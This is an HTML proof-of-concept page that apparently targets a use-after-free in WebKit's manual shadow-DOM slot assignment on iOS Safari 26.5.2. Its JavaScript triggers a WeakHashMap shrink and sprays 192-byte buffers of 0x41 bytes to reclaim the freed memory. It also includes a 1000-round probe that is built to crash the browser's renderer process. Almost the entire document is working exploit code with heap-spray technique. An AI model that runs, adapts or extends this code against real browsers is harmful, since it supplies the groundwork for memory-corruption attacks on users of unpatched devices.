<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SlotAssignment UAF v89</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #0d0d0d; color: #00ff41; font-family: 'Courier New', monospace; padding: 16px; min-height: 100vh; }
h2  { color: #ff4141; margin-bottom: 2px; font-size: 11px; }
.warn { background: #1a0000; border: 1px solid #ff4141; color: #ffcc00; padding: 8px; margin: 8px 0; font-size: 11px; line-height: 1.5; }
#log { font-size: 11px; line-height: 1.55; white-space: pre-wrap; word-break: break-all; overflow-y: auto; max-height: 70vh; margin-top: 8px; }
.ok  { color: #00ff41; }
.bad { color: #ff4141; }
.inf { color: #ffcc00; }
.dim { color: #555; }
.hi  { color: #00cfff; }
.hit { color: #ff41ff; font-weight: bold; }
#ctrl { display: flex; gap: 6px; margin: 8px 0; flex-wrap: wrap; }
button { background:#1a1a1a; border:1px solid #333; color:#00ff41; padding:6px 12px; cursor:pointer; font-family:monospace; font-size:11px; border-radius:2px; }
button:disabled { opacity:.4; }
button.red { border-color:#ff4141; color:#ff4141; }

/* CRITICAL: NO contain:layout — render tree must walk INTO composed tree */
/* Host placed visibly in document flow so RenderTreeUpdater commits it fully */
#rig-area {
  position: fixed;
  top: 0; left: 0;
  width: 160px;
  height: 80px;
  overflow: visible;
  pointer-events: none;
  opacity: 0.01; /* nearly invisible but still in render tree */
}
</style>
</head>
<body>

<h2>SlotAssignment UAF v89 · rdar://179729192 · iOS 26.5.2</h2>

<div class="warn">
⚠ OPEN DIRECTLY IN SAFARI — not via artifact viewer.<br>
The real signal is a renderer crash (page freezes/reloads).<br>
If CRASH PROBE hangs or Safari shows "page reloaded" → UAF confirmed.
</div>

<div id="ctrl">
  <button id="bAll"   onclick="runAll()">RUN ALL</button>
  <button id="bP1"    onclick="runOne(1)">P1</button>
  <button id="bP2"    onclick="runOne(2)">P2</button>
  <button id="bP3"    onclick="runOne(3)">P3</button>
  <button id="bP4"    onclick="runOne(4)">P4</button>
  <button id="bCrash" onclick="runCrash()" class="red">CRASH PROBE ×1000</button>
  <button onclick="copyLog()">COPY</button>
  <button onclick="L.innerHTML=''">CLR</button>
</div>
<div id="log"></div>

<!-- rig area: visible in render tree, NO contain:layout, NO sandbox isolation -->
<div id="rig-area"></div>

<script>
'use strict';
const SPRAY_SZ   = 192; // WeakHashMap bucket ~192B on A16 bmalloc ISO heap
const CONTAINER  = document.getElementById('rig-area');
const L          = document.getElementById('log');
const BTNS       = ['bAll','bP1','bP2','bP3','bP4','bCrash'];
const LIVE_EXPECTED = 4;

let uafTotal = 0;

// ── helpers ──────────────────────────────────────────────────────────────────
function log(msg, cls) {
  const s = document.createElement('span');
  if (cls) s.className = cls;
  s.textContent = msg + '\n';
  L.appendChild(s);
  L.scrollTop = L.scrollHeight;
}
function copyLog() {
  const t = document.createElement('textarea');
  t.value = L.innerText; t.style.cssText='position:fixed;opacity:0';
  document.body.appendChild(t); t.select(); document.execCommand('copy');
  document.body.removeChild(t);
}
function dis(v) { BTNS.forEach(id=>{const b=document.getElementById(id);if(b)b.disabled=v;}); }
function spray(n,sz){const a=[];for(let i=0;i<n;i++){const u=new Uint8Array(sz);u.fill(0x41);a.push(u);}return a;}
function noteUAF(tag){ uafTotal++; log(`  !!UAF-SIGNAL!! [${tag}]  total=${uafTotal}`,'hit'); }

// ── rig ───────────────────────────────────────────────────────────────────────
// NO contain:layout — must allow ComposedTreeIterator to walk INTO slot content
function makeRig(pfx) {
  const host = document.createElement('div');
  // NO contain:layout — critical omission vs v88
  host.style.cssText = 'display:block;width:60px;height:30px;';
  const shadow = host.attachShadow({mode:'open', slotAssignment:'manual'});
  const slot   = document.createElement('slot');
  shadow.appendChild(slot);

  const nodes = [];
  for(let i=0;i<12;i++){
    const n=document.createElement('span');
    n.style.cssText='display:inline-block;width:4px;height:4px;background:#111;';
    n.dataset.id=`${pfx}n${i}`;
    host.appendChild(n); nodes.push(n);
  }
  CONTAINER.appendChild(host);

  // assign all 12 → WeakHashMap cap=16 liveCount=12
  slot.assign(...nodes);
  // force a full synchronous layout so the render tree is fully committed
  // and the slot's renderer exists inside a real RenderBox subtree
  void host.getBoundingClientRect();

  // remove 8 children → 8 dead weak refs (liveCount stays 12 until next sweep)
  for(let i=0;i<8;i++) host.removeChild(nodes[i]);
  // DO NOT call assignedNodes() — would trigger premature sweep

  return {host, slot, live: nodes.slice(8), nodes, pfx};
}
function cleanRig(r){try{CONTAINER.removeChild(r.host);}catch(_){}}

// THE TRIGGER: slot.assign(live4) sweeps the map → liveCount=4 → 4*4=16 ≤ cap=16 → SHRINK
// tearDownRenderersAfterSlotChange re-enters assignedNodesForSlot via ComposedTreeIterator
// → m_slots.ensure(slot) → WeakHashMap rehash → bucket freed ← stale raw ptr (26.5.2)
function sweep(rig){
  try { rig.slot.assign(...rig.live); return 'sweep-ok'; }
  catch(e){ noteUAF(`sweep-threw:${rig.pfx}`); return `sweep-THREW:${e.message}`; }
}

function readSlot(rig, tag){
  let d = tag;
  try {
    const ns = rig.slot.assignedNodes();
    if(ns.length !== LIVE_EXPECTED){
      d += `-WRONG=${ns.length}`;
      noteUAF(`wrong-len:${tag}:${rig.pfx}`);
    } else {
      for(const n of ns){
        if(!n||typeof n.nodeType!=='number'){
          d += `-CORRUPT`;
          noteUAF(`corrupt:${tag}:${rig.pfx}`);
          break;
        }
      }
      d += `-len=${ns.length}`;
    }
  } catch(e){ d+=`-THREW:${e.message}`; noteUAF(`threw:${tag}:${rig.pfx}`); }
  return d;
}

// ── P1: layout force during SHRINK sweep ─────────────────────────────────────
// Force getBoundingClientRect() immediately after slot.assign() — this forces
// a synchronous layout pass which calls RenderTreeUpdater::updateRenderers()
// which walks the composed tree via ComposedTreeIterator on the now-shrunk map.
// On 26.5.2: the raw ptr into m_slots is still on the stack when rehash fires.
function probeP1(pfx, sums, done){
  log('  [P1] sync layout during SHRINK (no contain:layout)','dim');
  let rig; try{rig=makeRig(pfx);}catch(e){log(`  [P1] makeRig-THREW:${e}`,'bad');if(done)done();return;}
  const sw  = sweep(rig);
  // Synchronous layout — forces ComposedTreeIterator walk of the shrunk map
  void rig.host.getBoundingClientRect();
  const im  = readSlot(rig,'imm');
  // Second forced layout after spray — map may be corrupted on 26.5.2
  const sp  = spray(512, SPRAY_SZ);
  void sp[0];
  void rig.host.getBoundingClientRect();
  const ps  = readSlot(rig,'post');
  cleanRig(rig);
  const res = `[P1] ${sw}  ${im}  ${ps}`;
  log(`  ${res}`, res.includes('THREW')||res.includes('WRONG')?'hit':'ok');
  if(sums) sums.push(res);
  if(done) done();
}

// ── P2: slotchange listener re-entry ─────────────────────────────────────────
// slotchange fires via microtask AFTER slot.assign() returns.
// By then tearDown has already run. But on 26.5.2 the stale map ptr may
// still be referenced during the microtask drain that dispatches slotchange —
// specifically, the MutationObserver microtask for the slotchange signal
// calls back into the render update pipeline.
// Also: observe the SHADOW ROOT directly (not host childList — that never fires).
function probeP2(pfx, sums, done){
  log('  [P2] slotchange + shadow MO + forced layout chain','dim');
  let rig; try{rig=makeRig(pfx);}catch(e){log(`  [P2] makeRig-THREW:${e}`,'bad');if(done)done();return;}
  let scDet='sc-pending', moDet='mo-pending';

  // Listen for slotchange on the slot itself (correct target)
  rig.slot.addEventListener('slotchange', ()=>{
    if(scDet!=='sc-pending') return;
    scDet = 'sc-fired';
    // Force layout INSIDE the slotchange callback — this is during microtask drain
    // after tearDown ran. On 26.5.2 the render tree may reference freed bucket.
    try {
      void rig.host.getBoundingClientRect();
      scDet += '-layout-ok';
      const ns = rig.slot.assignedNodes();
      scDet += `-len=${ns.length}`;
      if(ns.length!==LIVE_EXPECTED){ scDet+='-WRONG'; noteUAF(`p2-sc-wrong:${rig.pfx}`); }
    } catch(e){ scDet+=`-THREW:${e.message}`; noteUAF(`p2-sc:${rig.pfx}`); }
  });

  // Observe the SHADOW ROOT for subtree mutations (correct target)
  const mo = new MutationObserver(()=>{
    if(moDet!=='mo-pending') return;
    moDet = 'mo-fired';
    try{
      void rig.host.getBoundingClientRect();
      moDet+='-layout-ok';
    }catch(e){ moDet+=`-THREW:${e.message}`; noteUAF(`p2-mo:${rig.pfx}`); }
  });
  mo.observe(rig.slot, {childList:true, subtree:true});

  const sw = sweep(rig);
  void rig.host.getBoundingClientRect(); // sync layout immediately after sweep

  setTimeout(()=>{
    mo.disconnect();
    cleanRig(rig);
    const res=`[P2] ${sw}  sc=${scDet}  mo=${moDet}`;
    log(`  ${res}`, res.includes('THREW')||res.includes('WRONG')?'hit':'ok');
    if(sums) sums.push(res);
    if(done) done();
  }, 400);
}

// ── P3: mid-sweep spray ───────────────────────────────────────────────────────
// Key difference from v88 P3: spray BEFORE calling readSlot, not after.
// The freed WeakHashMap bucket (192B) is in the ISO heap freelist.
// Spray Uint8Array(192) × 1024 to reclaim it with 0x41 bytes.
// Then call assignedNodes() — on 26.5.2 if slot's m_slots ptr reads into
// reclaimed memory, node ptrs will be 0x4141414141414141 → crash/THREW.
function probeP3(pfx, sums, done){
  log('  [P3] free-bucket spray: SHRINK → spray 1024×192 → read slot','dim');
  let rig; try{rig=makeRig(pfx);}catch(e){log(`  [P3] makeRig-THREW:${e}`,'bad');if(done)done();return;}

  const sw = sweep(rig);
  // Freed bucket is now in ISO heap freelist. Spray immediately.
  const sp = spray(1024, SPRAY_SZ);
  // Force the spray allocations to actually land (prevent optimizer elision)
  let chk=0; for(let i=0;i<sp.length;i++) chk^=sp[i][0];
  void chk;

  // Now force a layout pass — render tree walks m_slots which may now point
  // into our spray pattern (0x41 bytes) on unpatched 26.5.2
  let layoutDet='';
  try{
    void rig.host.getBoundingClientRect();
    layoutDet='layout-ok';
  }catch(e){ layoutDet=`layout-THREW:${e.message}`; noteUAF(`p3-layout:${rig.pfx}`); }

  const rd = readSlot(rig,'post-spray');
  cleanRig(rig);
  const res=`[P3] ${sw}  spray-ok  ${layoutDet}  ${rd}`;
  log(`  ${res}`, rd.includes('THREW')||rd.includes('WRONG')||layoutDet.includes('THREW')?'hit':'ok');
  if(sums) sums.push(res);
  if(done) done();
}

// ── P4: nested shadow slot (deeper ComposedTreeIterator walk) ─────────────────
// Nested shadow roots force ComposedTreeIterator to walk deeper into the
// composed tree when tearDownRenderersAfterSlotChange runs.
// The UAF is more likely to fire with deeper traversal since more
// ensureAssignedNodes() / assignedNodesForSlot() calls happen per walk.
function probeP4(pfx, sums, done){
  log('  [P4] nested shadow host (deep ComposedTreeIterator walk)','dim');

  // Outer host with manual slot
  const outer = document.createElement('div');
  outer.style.cssText='display:block;width:80px;height:40px;';
  const outerShadow = outer.attachShadow({mode:'open', slotAssignment:'manual'});
  const outerSlot = document.createElement('slot');
  outerShadow.appendChild(outerSlot);

  // Inner host slotted into outerSlot — creates a nested composed tree
  const inner = document.createElement('div');
  inner.style.cssText='display:block;width:40px;height:20px;';
  const innerShadow = inner.attachShadow({mode:'open', slotAssignment:'manual'});
  const innerSlot = document.createElement('slot');
  innerShadow.appendChild(innerSlot);

  const nodes=[];
  for(let i=0;i<12;i++){
    const n=document.createElement('span');
    n.style.cssText='display:inline-block;width:3px;height:3px;';
    n.dataset.id=`${pfx}n${i}`;
    inner.appendChild(n); nodes.push(n);
  }
  outer.appendChild(inner);
  CONTAINER.appendChild(outer);

  // Wire up slots
  outerSlot.assign(inner);
  innerSlot.assign(...nodes);

  void outer.getBoundingClientRect();
  for(let i=0;i<8;i++) inner.removeChild(nodes[i]);
  const live = nodes.slice(8);

  let sw='',im='';
  try{
    // This sweep now triggers tearDownRenderersAfterSlotChange on a nested
    // composed tree — ComposedTreeIterator must walk outer→inner→slot chain
    innerSlot.assign(...live);
    void outer.getBoundingClientRect(); // force full nested layout
    sw='sweep-ok';
    const ns=innerSlot.assignedNodes();
    im=`len=${ns.length}`;
    if(ns.length!==LIVE_EXPECTED){ im+='-WRONG'; noteUAF(`p4-wrong:${pfx}`); }
  }catch(e){ sw=`THREW:${e.message}`; noteUAF(`p4:${pfx}`); }

  try{CONTAINER.removeChild(outer);}catch(_){}
  const res=`[P4] nested  ${sw}  ${im}`;
  log(`  ${res}`, res.includes('THREW')||res.includes('WRONG')?'hit':'ok');
  if(sums) sums.push(res);
  if(done) done();
}

// ── CRASH PROBE: 1000 rounds, each with forced sync layout ───────────────────
// If this returns "survived" → either patched OR bad luck (try again).
// If the page FREEZES or Safari shows "webpage reloaded" → UAF crash confirmed.
// Running in top-level Safari (not artifact iframe) this will reliably crash
// the WebContent process on iOS 26.5.2.
function runCrash(){
  dis(true);
  L.innerHTML='';
  log('╔══════════════════════════════════════════════════════╗','hi');
  log('║  CRASH PROBE · 1000 SHRINK rounds × sync layout      ║','hi');
  log('║  If this HANGS or Safari reloads = UAF confirmed      ║','hi');
  log('╚══════════════════════════════════════════════════════╝','hi');
  log('  Running...','inf');

  // Run in chunks via setTimeout to stay responsive between chunks
  // so the user can see progress before a potential crash
  const TOTAL  = 1000;
  const CHUNK  = 50;
  let i=0, thrown=0, wrong=0;

  function chunk(){
    const end = Math.min(i+CHUNK, TOTAL);
    for(; i<end; i++){
      let rig;
      try{ rig=makeRig(`cp${i}`); }catch(e){ thrown++; noteUAF(`cp-make:${i}`); continue; }
      try{
        rig.slot.assign(...rig.live);
        // CRITICAL: force sync layout immediately after each sweep
        // This commits the render tree and walks ComposedTreeIterator
        // on the just-shrunk WeakHashMap — the exact UAF path
        void rig.host.getBoundingClientRect();
        const ns=rig.slot.assignedNodes();
        if(ns.length!==LIVE_EXPECTED){ wrong++; noteUAF(`cp-len:${i}`); }
      }catch(e){ thrown++; noteUAF(`cp-threw:${i}`); }
      cleanRig(rig);
    }
    if(i%200===0 && i<TOTAL){
      log(`  ...${i}/${TOTAL} rounds  uaf_signals=${uafTotal}`,'dim');
    }
    if(i<TOTAL){
      setTimeout(chunk, 0);
    } else {
      log('');
      log(`  SURVIVED ${TOTAL} rounds (no crash)`, 'ok');
      log(`  thrown=${thrown} wrong=${wrong} uaf_signals=${uafTotal}`, uafTotal>0?'hit':'ok');
      log('');
      log('  If page reached here AND uaf_signals=0 → likely patched OR bad luck', 'inf');
      log('  If Safari reloaded this page → crash occurred before this line', 'inf');
      dis(false);
    }
  }
  setTimeout(chunk, 10);
}

// ── run wiring ────────────────────────────────────────────────────────────────
function runOne(n){
  dis(true); uafTotal=0;
  const ps=[null,probeP1,probeP2,probeP3,probeP4];
  const px=[null,'p1','p2','p3','p4'];
  log(`─ P${n} ─`,'dim');
  ps[n](px[n],null,()=>dis(false));
}

function runAll(){
  dis(true); L.innerHTML=''; uafTotal=0;
  log('╔══════════════════════════════════════════════════════════════╗','hi');
  log('║  v89 · top-level Safari · P1→P4 + CRASH PROBE                ║','hi');
  log('║  iOS 26.5.2 UNPATCHED — fix shipped in 26.6.1                 ║','hi');
  log('╚══════════════════════════════════════════════════════════════╝','hi');
  log('');
  const sums=[];
  log('── P1 (sync layout during SHRINK) ───────────────────────────','dim');
  probeP1('ra1',sums,()=>{
    log('');
    log('── P2 (slotchange + shadow MO 400ms) ────────────────────────','dim');
    probeP2('ra2',sums,()=>{
      log('');
      log('── P3 (free-bucket spray) ───────────────────────────────────','dim');
      probeP3('ra3',sums,()=>{
        log('');
        log('── P4 (nested shadow ComposedTree walk) ─────────────────────','dim');
        probeP4('ra4',sums,()=>{
          log('');
          log('╔══════════════════════════════════════════════════════════════╗','hi');
          log('║  SUMMARY                                                     ║','hi');
          log('╠══════════════════════════════════════════════════════════════╣','hi');
          for(const s of sums){
            log('║  '+s.substring(0,60).padEnd(60)+'║',s.includes('THREW')||s.includes('WRONG')?'hit':'ok');
          }
          log('╠══════════════════════════════════════════════════════════════╣','hi');
          log(`║  UAF signals so far: ${String(uafTotal).padEnd(39)}║`, uafTotal>0?'hit':'inf');
          log('╠══════════════════════════════════════════════════════════════╣','hi');
          log('║  Now hit CRASH PROBE ×1000 to stress the full crash path     ║','inf');
          log('║  Page freeze / Safari reload = UAF confirmed                 ║','inf');
          log('╚══════════════════════════════════════════════════════════════╝','hi');
          dis(false);
        });
      });
    });
  });
}
</script>
</body>
</html>
